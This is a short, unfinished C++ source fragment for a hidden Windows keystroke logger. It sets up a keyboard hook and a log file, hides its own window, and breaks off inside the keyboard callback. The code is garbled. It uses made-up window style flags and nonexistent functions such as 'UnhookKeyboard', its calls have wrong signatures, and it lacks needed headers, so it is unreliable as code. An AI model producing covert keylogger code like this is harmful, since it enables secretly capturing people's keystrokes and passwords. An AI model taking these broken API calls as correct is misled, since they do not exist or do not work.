#include <fstream>
#include <thread>
#include <time.h>

using namespace std;

// Global variables
HWND hwnd;
HHOOK hKeyboardHook;
bool g_loggingEnabled = false;
int g_logFile = -1;

// Function prototypes
void Initialize();
void Uninitialize();
void KeyboardCallback(int nCode, int wParam, int lParam);
void LogKey(int key);
void OpenLogFile();
void CloseLogFile();

// Main function
int main()
{
    Initialize();
    ShowWindow(hwnd, SW_HIDE);
    StartLoggingThread();
    return 0;
}

void Initialize()
{
    // Initialize global variables and set up the window
    hwnd = CreateWindow("Keystroke Logger", 0, 0, 0, 0, 0, WS_HIDErics | WS_OVERLapped, HWND_DESKTOP, 0, 0);
    if (!hwnd)
    {
        cout << "Failed to create window." << endl;
        return;
    }
}

void Uninitialize()
{
    // Cleanup and release resources
    if (hKeyboardHook)
        UnhookKeyboard(hwnd, hKeyboardHook);
    DestroyWindow(hwnd);
    CloseLogFile();
}

// Callback function for keyboard events
void KeyboardCallback(int nCode, int wParam, int lParam)
{
